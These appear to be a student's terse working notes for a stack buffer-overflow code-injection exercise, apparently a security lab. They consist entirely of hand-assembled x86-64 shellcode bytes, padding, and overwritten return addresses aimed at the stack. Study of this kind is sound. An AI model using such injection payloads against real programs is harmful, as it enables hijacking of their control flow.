mov 0x404148,%eax
push $0x401469
ret

0:   8b 04 25 48 41 40 00    mov    0x404148,%eax
7:   68 69 14 40 00          push   $0x401469
c:   c3                      ret

8b 04 25 48 41 40 00 
68 69 14 40 00 
c3 
00 
00 00 00 
00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
30 e0 ff ff ff 7f 00 00 d0 df ff ff ff 7f 00 00


d0 dd ff ff ff 7f 00 00 70 dd ff ff ff 7f 00 00

d = 13
e = 14
f = 15


8b 04 25 48 41 40 00    mov    0x404148,%eax
7:   48 89 e5                mov    %rsp,%rbp
a:   48 83 c5 30             add    $0x30,%rbp
e:   68 69 14 40 00          push   $0x401469
13:   c3                      ret

8b 04 25 48 41 40 00  /*  mov    0x404148,%eax */
48 89 e5              /*  mov    %rsp,%rbp     */
48 83 c5 30           /*  add    $0x30,%rbp    */
68 69 14 40 00        /*  push   $0x401469     */
c3                    /*  ret                  */
00
00 00 00 00 00
00 00 00 00
00 00 00
00 00 00 00 00 00 00
c0 df ff ff ff 7f 00